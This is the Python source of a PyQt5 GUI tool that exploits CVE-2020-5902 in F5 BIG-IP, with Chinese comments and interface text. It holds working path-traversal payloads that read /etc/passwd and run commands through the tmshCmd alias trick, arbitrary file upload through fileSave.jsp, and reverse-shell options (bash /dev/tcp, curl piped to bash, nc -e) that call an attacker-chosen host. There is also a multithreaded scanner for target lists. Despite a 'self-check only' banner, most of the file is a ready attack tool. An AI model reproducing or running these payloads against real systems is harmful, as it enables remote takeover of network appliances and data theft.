#!/usr/bin/python3.8
# -*- coding: utf-8 -*-
# @Time    : 2020/6/26 5:51 下午
# @Author  : rocky
# @Email   : 939555035@qq.com
# @File    : run-main.py
# @Software: PyCharm

import sys
import OperatingUi
import re
import importlib
import os
import logging
from threading import Thread
from queue import Queue
import threading
import ctypes
import inspect
from PyQt5.QtCore import QThread, pyqtSignal, QDateTime, QObject
from PyQt5.QtWidgets import QApplication, QMainWindow, QFileDialog

import requests
import time, random
import json

requests.packages.urllib3.disable_warnings()

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) \
Chrome/53.0.2785.104 Safari/537.36 Core/1.53.4549.400 QQBrowser/9.7.12900.400"
}


def getTime():
    now = datetime.now()
    return now.strftime('%H:%M:%S')


def showSuccess(message):
    print('[\033[1;94m{}\033[0;m] [\033[1;92m+\033[0;m] \033[1;92m{}\033[0;m'.format(getTime(), message))


class BackendThread(QThread):
    update_date = pyqtSignal(str)
    update_status = pyqtSignal(str)

    def __init__(self, thread_num, payload, targetTxtPath, flag):
        super(BackendThread, self).__init__()
        self.thread_num = thread_num
        self.payload = payload
        self.targetTxtPath = targetTxtPath
        self.flag = flag

    def __del__(self):
        self.wait()

    def run(self):
        self.url_queue = Queue()
        self.start_url_scan(self.thread_num, self.payload, self.flag)

    # 获取文件url，并添加队列
    def get_base_data(self):
        url_list = [i.replace("\n", "") for i in open(self.targetTxtPath, "r").readlines()]
        for url in url_list:
            self.url_queue.put(url, block=False)

    # 获取漏洞POC扫描结果
    def poc_scan(self, payload):
        while not self.url_queue.empty():  # 如果while True 线程永远不会终止:
            time.sleep(random.random())
            url = self.url_queue.get()
            if url is None:
                break
            elif 'https://' in url:
                pass
            elif 'https://' not in url and url != '':
                url = 'https://' + url
            else:
                break
            if payload == 'CVE_2020_5902_BIG_IP_RCE':
                payload01 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
                payload02 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts'
            else:
                self.update_date.emit("您输入的参数有误!")
            url1 = url + payload01
            url2 = url + payload02
            currentTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            try:
                resp1 = requests.get(url1, verify=False, headers=headers, timeout=5)
                time.sleep(random.random())
                resp2 = requests.get(url2, verify=False, headers=headers, timeout=5)
                # resp3 = requests.get('{}/tmui/login.jsp'.format(url), verify=False, timeout=5)
                if 'root' in resp1.text or 'localhost' in resp2.text:
                    # hostname = re.search(r'<p\stitle=\"(.*?)\">', resp3.text).group(1).strip().lower()
                    # self.updata_date.emit('[+]{} : 存在漏洞 {}'.format(url, currentTime))
                    self.update_date.emit('[+]{} : 存在漏洞 {}'.format(url, currentTime))
                    print('[+]{} : 存在漏洞 {}'.format(url, currentTime))
                else:
                    self.update_date.emit('[-]{} : 不存在漏洞 {}'.format(url, currentTime))
            except requests.exceptions.RequestException as e:
                print('[-]{} : 请求超时 {}'.format(url, currentTime))
                self.update_date.emit('[-]{} : 请求超时 {}'.format(url, currentTime))
                pass

    def start_url_scan(self, thread_num, payload, flag):
        try:
            # print(flag)
            self.update_status.emit(str(f'扫描启动!'))
            self.update_date.emit(str(f'>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'))
            self.thread_num = thread_num
            self.get_base_data()
            threads = []
            for i in range(self.thread_num):
                t = Thread(target=self.poc_scan, args=(payload,))
                t.setDaemon(True)
                t.start()
                threads.append(t)
                if flag == 0:
                    self.stop_thread(t)
                    print(flag)
                else:
                    pass
            for t in threads:
                t.join()
            self.update_status.emit(str(f'扫描完毕!'))
            self.url_queue.queue.clear()


        except Exception as e:
            self.update_date.emit(f'错误信息：{e}')
            self.update_date.emit(f'发生错误，请检查输入的简介页URL是否完整、网络设置是否正确')
            self.update_date.emit(f'如果不知道什么是“简介页URL”和正确的网络设置，请点击“使用帮助”按钮进行查看')

    def _async_raise(self, tid, exctype):
        """raises the exception, performs cleanup if needed"""
        tid = ctypes.c_long(tid)
        if not inspect.isclass(exctype):
            exctype = type(exctype)
        res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))
        if res == 0:
            raise ValueError("invalid thread id")
        elif res != 1:
            # """if it returns a number greater than one, you're in trouble,
            # and you should call it again with exc=NULL to revert the effect"""
            ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
            raise SystemError("PyThreadState_SetAsyncExc failed")

    def stop_thread(self, thread):
        self._async_raise(thread.ident, SystemExit)


class MainWindow(QMainWindow, QObject):
    send_args = pyqtSignal(str, int)
    send_sing = pyqtSignal(str)
    commandBasicInfo = pyqtSignal(str)  # 命令执行结果信号获取
    textEditinfo = pyqtSignal(str)

    def __init__(self, parent=None):
        super(MainWindow, self).__init__(parent)
        self.ui = OperatingUi.Ui_MainWindow()
        self.ui.setupUi(self)
        self.commandBasicInfo.connect(self.handleDisplayCommand)
        self.textEditinfo.connect(self.handlestatusOne)

    def setupFunction(self):
        items = ["CVE_2020_5902_BIG_IP_RCE"]
        self.ui.payloadCombo.addItems(items)
        items = ["/bin/bash -i >& /dev/tcp/ip/port 0>&1", "curl ip:port | bash", "nc ip port -e /bin/bash"]
        self.ui.reboundCombo.addItems(items)
        commanditems = ["whoami", "ifconfig",
                        "netstat -an", "id"]
        self.ui.commandCombo.addItems(commanditems)
        command_3items = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17",
                          "18", "19", "20", ]
        self.ui.commandCombo_3.addItems(command_3items)
        self.ui.commondButton_6.clicked.connect(self.send)
        self.ui.emptyButton.clicked.connect(self.clearResult)
        self.ui.commondButton.clicked.connect(self.execcommondPayload)
        self.ui.commondButton_2.clicked.connect(self.uploadfile)
        self.ui.commondButton_4.clicked.connect(self.openfile)
        self.ui.CheckButton.clicked.connect(self.execCheckPayloadb)
        self.ui.reboundButton.clicked.connect(self.startExecReb)
        self.ui.commondButton_3.clicked.connect(self.stop)

        basicTxt = '''        
警告：本工具为漏洞自查工具，请勿非法攻击他人网站！
F5 BIG-IP 是美国F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。
【影响版本】
BIG-IP 15.x: 15.1.0/15.0.0
BIG-IP 14.x: 14.1.0 ~ 14.1.2
BIG-IP 13.x: 13.1.0 ~ 13.1.3
BIG-IP 12.x: 12.1.0 ~ 12.1.5
BIG-IP 11.x: 11.6.1 ~ 11.6.5     
【集成情况】 
CVE_2020_5902_BIG_IP_RCE
        '''
        self.ui.basicInfoTextEdit.setText(basicTxt)

    def send(self):
        # http_url = self.lineEdit.text()    # 获取第一个文本框中的内容
        thread_num = int(self.ui.commandCombo_3.currentText())  # 获取线程数
        payload = self.ui.payloadCombo.currentText()  # 获取漏洞Payload
        targetTxtPath = self.ui.localListenEdit_3.text()  # 获取导入文件路径
        flag = 1
        self.backend = BackendThread(thread_num, payload, targetTxtPath, flag)
        self.backend.update_date.connect(self.handleDisplay)
        self.backend.update_status.connect(self.handlestatus)
        self.backend.start()
        # self.send_args.emit(http_url, thread_num)

    # 结束进程
    def stop(self):
        self.backend.flag = 0
        print(getattr(self.backend, '__dict__'))

    # 显示到ui命令执行后返回的结果信号
    def handleDisplayCommand(self, data):
        self.ui.commandBasicInfoTextEdit.setText(data)

    def handleDisplay(self, data):
        self.ui.commandBasicInfoTextEdit_3.append(data)  # 在指定的区域显示提示信息
        self.cursor = self.ui.commandBasicInfoTextEdit_3.textCursor()
        self.ui.commandBasicInfoTextEdit_3.moveCursor(self.cursor.End)  # 光标移到最后，这样就会自动显示出来
        QApplication.processEvents()  # 一定加上这个功能，不然有卡顿

        # 更新状态

    def handlestatusOne(self, data):
        self.ui.textEdit.append(data)  # 在指定的区域显示提示信息
        # self.cursor = self.ui.textEdit.textCursor()
        # self.ui.textEdit.moveCursor(self.cursor.End)  # 光标移到最后，这样就会自动显示出来
        QApplication.processEvents()  # 一定加上这个功能，不然有卡顿

    def handlestatus(self, data):
        self.ui.textEdit.append(data)  # 在指定的区域显示提示信息
        self.cursor = self.ui.textEdit.textCursor()
        self.ui.textEdit.moveCursor(self.cursor.End)  # 光标移到最后，这样就会自动显示出来
        QApplication.processEvents()  # 一定加上这个功能，不然有卡顿

    # 检测payload
    def checkPayload(self):
        targetAddr = self.ui.targetlineEdit.text() # 获取
        payload = self.ui.payloadCombo.currentText()
        module = 'rocCheckPayload.{}'.format(payload)
        importModule = importlib.import_module(module)
        data = importModule.CVE_2020_5902_BIG_IP_RCE.runCheck(self, targetAddr, payload)
        self.textEditinfo.emit('{}'.format(data['data']))

    # 多线程执行检测
    def execCheckPayloadb(self):
        thread = Thread(target=self.checkPayload)
        thread.start()

    # 利用payload命令执行
    def commondPayload(self):
        targetAddr = self.ui.targetlineEdit.text()
        payload = self.ui.payloadCombo.currentText()
        command = self.ui.commandCombo.currentText()
        module = 'rocCommondPayload.{}'.format(payload)
        importModule = importlib.import_module(module)
        data = importModule.CVE_2020_5902_BIG_IP_RCE.runCommond(self, targetAddr, payload,command)
        print(data)
        if data['type'] == 'status':
            self.textEditinfo.emit('{}'.format(data['data']))
        elif data['type'] == 'content':
            self.commandBasicInfo.emit('{}'.format(data['data']))
        else:
            self.textEditinfo.emit('type错误')

    def execcommondPayload(self):
        thread = Thread(target=self.commondPayload)
        thread.start()

    def startExecReb(self):
        thread = Thread(target=self.execRebound)
        thread.start()

    def execRebound(self):
        targetAddr = self.ui.targetlineEdit.text()
        if 'https://' in targetAddr:
            pass
        else:
            targetAddr = 'https://' + targetAddr
        payload = self.ui.payloadCombo.currentText()
        lhost = self.ui.lipaddrlineEdit.text()
        lport = self.ui.lport.text()
        rebound = self.ui.reboundCombo.currentText()

        if rebound == 'curl ip:port':
            reboundData = r'curl {}:{} | bash'.format(lhost, lport)
        elif rebound == '/bin/bash -i >& /dev/tcp/ip/port 0>&1':
            reboundData = r'/bin/bash+-i>%26+/dev/tcp/{}/{}+0>%261'.format(lhost, lport)
        elif rebound == 'nc ip port -e /bin/bash':
            reboundData = r'nc {} {} -e /bin/bash'.format(lhost, lport)
        else:
            return '操作错误'

        if payload == 'CVE_2020_5902_BIG_IP_RCE':
            payload01 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash'
            payload02 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content={}'.format(
                reboundData)
            payload03 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd'
            payload04 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'
        else:
            return self.ui.textEdit.append('您的输入有误,或者没有加HTTPS请求头!')

        url1 = targetAddr + payload01
        url2 = targetAddr + payload02
        url3 = targetAddr + payload03
        url4 = targetAddr + payload04

        try:
            requests.get(url1, verify=False, headers=headers, timeout=5)
            requests.get(url2, verify=False, headers=headers, timeout=5)
            r = requests.get(url3, verify=False, headers=headers, timeout=5)
            return self.ui.textEdit.append('[+]反弹执行完成!')
        except requests.exceptions.RequestException as e:
            pass

        try:
            r = requests.get(url4, verify=False, headers=headers, timeout=5)
            return self.ui.textEdit.append('还原alias设置，防止影响目标正常使用!')
        except requests.exceptions.RequestException as e:
            pass

    def uploadfile(self):
        targetAddr = self.ui.targetlineEdit.text()

        if 'https://' in targetAddr:
            pass
        else:
            targetAddr = 'https://' + targetAddr

        payload = self.ui.payloadCombo.currentText()
        # command = self.ui.commandCombo.currentText()
        lhost = self.ui.lipaddrlineEdit.text()
        lport = self.ui.lport.text()
        rebound = self.ui.reboundCombo.currentText()
        filepath = self.ui.localListenEdit_2.text()
        content = self.ui.commandBasicInfoTextEdit_2.toPlainText()

        if payload == 'CVE_2020_5902_BIG_IP_RCE':
            payload01 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash'
            payload02 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName={}&content={}'.format(
                filepath, content)
            payload03 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd'
            payload04 = r'/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'
        else:
            return self.ui.textEdit.append('您的输入有误,或者没有加HTTPS请求头!')
        url1 = targetAddr + payload01
        url2 = targetAddr + payload02
        url3 = targetAddr + payload03
        url4 = targetAddr + payload04

        try:
            requests.get(url1, verify=False, headers=headers, timeout=5)
        except requests.exceptions.RequestException as e:
            pass

        try:
            requests.get(url2, verify=False, headers=headers, timeout=5)
            return self.ui.textEdit.append('[+]上传文件成功!路径为:{}'.format(filepath))
        except requests.exceptions.RequestException as e:
            pass

    # 打开文件
    def openfile(self):
        fileName1, filetype = QFileDialog.getOpenFileName(self,
                                                          "选取文件",
                                                          "./",
                                                          "All Files (*);;Text Files (*.txt)")  # 设置文件扩展名过滤,注意用双分号间隔

        return self.ui.localListenEdit_3.setText(fileName1)

    def clearResult(self):
        self.ui.textEdit.clear()


if __name__ == '__main__':
    QApplication.processEvents()
    time.sleep(1)
    app = QApplication(sys.argv)
    win = MainWindow()
    win.setupFunction()
    win.show()
    sys.exit(app.exec_())
